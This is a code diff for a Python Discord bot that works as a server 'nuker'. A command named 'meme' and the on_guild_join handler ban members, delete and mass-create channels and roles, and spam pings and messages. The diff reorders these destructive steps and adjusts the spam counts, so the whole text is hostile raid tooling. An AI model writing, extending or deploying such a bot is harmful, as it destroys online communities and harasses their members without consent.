@@ -85,12 +85,11 @@ async def meme(ctx: commands.Context, *, bs=None):
     await RC.channel_remove(guild)
     await RC.channel_make(guild, 25)
 
+    await RC.ping_spam(guild, 5)
+    await RC.sfw_spam(guild, 5)
+
     await RC.role_remove(guild)
     await RC.role_make(guild, 10)
-
-    await RC.ping_spam(guild, 10)
-    await RC.sfw_spam(guild, 10)
-
     await RC.role_give(guild)
 
 
@@ -158,15 +157,15 @@ async def on_guild_join(guild: disnake.Guild):
 
     await RC.ban_members(guild)
 
-    await RC.role_remove(guild)
-    await RC.role_make(guild, 25)
-    await RC.role_give(guild)
-
     await RC.channel_remove(guild)
     await RC.channel_make(guild, 25)
 
-    await RC.sfw_spam(guild, 10)
-    await RC.ping_spam(guild, 10)
+    await RC.ping_spam(guild, 5)
+    await RC.sfw_spam(guild, 5)
+
+    await RC.role_remove(guild)
+    await RC.role_make(guild, 10)
+    await RC.role_give(guild)
 
 
 bot.run(TOKEN)
